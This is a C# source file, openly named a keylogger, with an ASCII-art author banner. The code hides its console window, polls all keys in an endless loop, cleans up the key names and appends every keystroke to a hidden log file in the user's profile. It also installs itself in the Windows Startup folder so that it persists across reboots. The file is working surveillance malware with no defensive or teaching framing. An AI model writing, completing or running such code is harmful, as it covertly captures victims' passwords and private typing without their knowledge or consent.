// by  ___________________________________________________________________________________________________
//    /                                                                                                   \
//   /          /\         |\        | ----------    -----------        /\         ________     \        / \ 
//   |         /  \        | \       | |         |   |                 /  \        |       \     \      /   |
//   |        /    \       |  \      | |         |   |                /    \       |        \     \    /    |
//   |       /      \      |   \     | |         |   |               /      \      |         |     \  /     |
//   |      /--------\     |    \    | |---------    |----------    /--------\     |         |      ||      |
//   |     /          \    |     \   | |  \          |             /          \    |         |      ||      |
//   |    /            \   |      \  | |   \         |            /            \   |        /       ||      |
//   |   /              \  |       \ | |    \        |           /              \  |       /        ||      |
//   \  /                \ |        \| |     \       ---------- /                \ --------         ||      /
//    \                                                                                                    /
//     ----------------------------------------------------------------------------------------------------


using System.IO;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using App;

namespace KeyLogger
{
    class Program
    {
        const int SW_HIDE = 0;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        private static string _Key = string.Empty;

        static void Main()
        {
            ShowWindow(GetConsoleWindow(), SW_HIDE);
            int Keys = Enum.GetValues(typeof(Keys)).Length;
            string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\log.log";
            string autostart = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\App.lnk";
            Class1 t = new Class1();
            t.Main(autostart, "App.exe");
            string _PKey = "";

            while (true)
            {
                for (int i = 0; i < Keys; i++) if (GetAsyncKeyState(i) == -32767) _Key += Enum.GetName(typeof(Keys), i);

                if (_Key.Length <= 0) { Thread.Sleep(50); continue; }

                if (_Key.Equals("LButton")) { _Key = string.Empty; continue; }
                if (_Key.Equals("RButton")) { _Key = string.Empty; continue; }
                if (_Key.Equals("Decimal")) { _Key = "."; }

                if (_Key == "D0" || _Key == "D1" || _Key == "D2" || _Key == "D3" || _Key == "D4" || _Key == "D5" || _Key == "D6" || _Key == "D7" || _Key == "D8" || _Key == "D9")
                {
                    _Key = _Key.Replace("D", "");
                }

                _Key = _Key.Replace("NumPad", "");
                _Key = _Key.Replace("ShiftKeyLShiftKey", "Shift");
                _Key = _Key.Replace("ShiftKeyRShiftKey", "Shift");
                _Key = _Key.Replace("ShiftLShiftKey", "Shift");
                _Key = _Key.Replace("ShiftRShiftKey", "Shift");
                _Key = _Key.Replace("ShiftShift", "Shift");
                _Key = _Key.Replace("ShiftKey", "Shift");
                _Key = _Key.Replace("LShift", "Shift");
                _Key = _Key.Replace("MenuLMenu", "Alt");
                _Key = _Key.Replace("MenuRMenu", "Alt");
                _Key = _Key.Replace("LWin", "Win");
                _Key = _Key.Replace("ControlKeyRControlKey", "Ctrl");
                _Key = _Key.Replace("ControlKeyLControlKey", "Ctrl");
                _Key = _Key.Replace("CtrlLControlKey", "Ctrl");
                _Key = _Key.Replace("CtrlRControlKey", "Ctrl");
                _Key = _Key.Replace("CtrlControlKey", "Ctrl");
                _Key = _Key.Replace("CtrlCtrl", "Ctrl");
                _Key = _Key.Replace("OemMinus", "-");
                _Key = _Key.Replace("Right", "➡");
                _Key = _Key.Replace("Left", "⬅"); 
                _Key = _Key.Replace("Up", "⬆");
                _Key = _Key.Replace("Down", "⬇");
                _Key = _Key.Replace("OemPeriod", ".");
                _Key = _Key.Replace("OemPlus", "=");
                _Key = _Key.Replace("Oemcomma", ",");
                _Key = _Key.Replace("Divide", "/");
                _Key = _Key.Replace("Multiply", "*");
                _Key = _Key.Replace("Subtract", "-");
                _Key = _Key.Replace("Add", "+");
                _Key = _Key.Replace("Enter", Environment.NewLine);

                if(_PKey == "Shift" || _PKey == "Win" || _PKey == "Ctrl")
                {
                    if(_Key == "Shift" || _Key == "Win" || _Key == "Ctrl")
                    {
                        continue;
                    }
                    _PKey = _Key;
                    _Key = "+ " + _Key;
                    Console.WriteLine(_Key);
                    _Key = _Key.ToLower();
                    _Key += " ";
                    File.AppendAllText(path, _Key);
                    _Key = string.Empty;
                    continue;
                }
                _PKey = _Key;
                _Key = _Key.ToLower();
                _Key += " ";
                File.AppendAllText(path, _Key);
                _Key = string.Empty;
            }
        }
    }
}